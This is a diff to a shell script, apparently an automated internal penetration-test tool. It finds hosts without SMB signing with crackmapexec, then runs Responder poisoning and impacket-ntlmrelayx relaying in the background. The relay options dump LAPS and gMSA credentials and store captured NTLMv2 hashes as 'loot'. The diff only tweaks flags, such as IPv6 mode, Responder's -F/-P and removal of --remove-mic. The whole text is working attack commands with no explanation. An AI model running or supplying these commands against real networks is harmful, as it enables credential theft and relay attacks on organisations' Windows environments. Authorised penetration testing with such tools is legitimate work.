@@ -47,7 +47,7 @@ fi
 if [ -f /root/output/list/smb_sign_off.txt ]; then
    echo '! > SMB Signing List exist.'
 else
-   crackmapexec smb /root/output/list/smb_open.txt --gen-relay-list /root/output/list/smb_sign_off.txt | tee /root/output/cme_beauty.txt
+   crackmapexec smb /root/output/list/smb_open.txt --gen-relay-list /root/output/list/smb_sign_off.txt > /root/output/cme_beauty.txt
 fi
 
 if [ -s /root/output/list/smb_sign_off.txt ]; then
@@ -59,8 +59,8 @@ fi
 
 #Responder with 300sec timeout in bg
 echo '! > Starting Responder && impacket-ntlmrelayx'
-timeout 300 responder -I eth0 -rdwv >> /root/output/responder.txt &
-timeout 300 impacket-ntlmrelayx -ip $IP -ts -ra --dump-laps --dump-gmsa -l /root/output/loot -of /root/output/loot/ntlm_relay_ntlmv2.txt --remove-mic -smb2support -tf /root/output/list/smb_sign_off.txt >> /root/output/relay.txt &
+timeout 300 responder -I eth0 -dwvFP >> /root/output/responder.txt &
+timeout 300 impacket-ntlmrelayx -6 -ts -ra --dump-laps --dump-gmsa -l /root/output/loot -of /root/output/loot/ntlm_relay_ntlmv2.txt -smb2support -tf /root/output/list/smb_sign_off.txt >> /root/output/relay.txt &
 
 PID_RESPONDER=`jobs -l | awk '/responder/ {print$2}'`
 PID_RELAY=`jobs -l | awk '/ntlmrelayx/ {print$2}'`
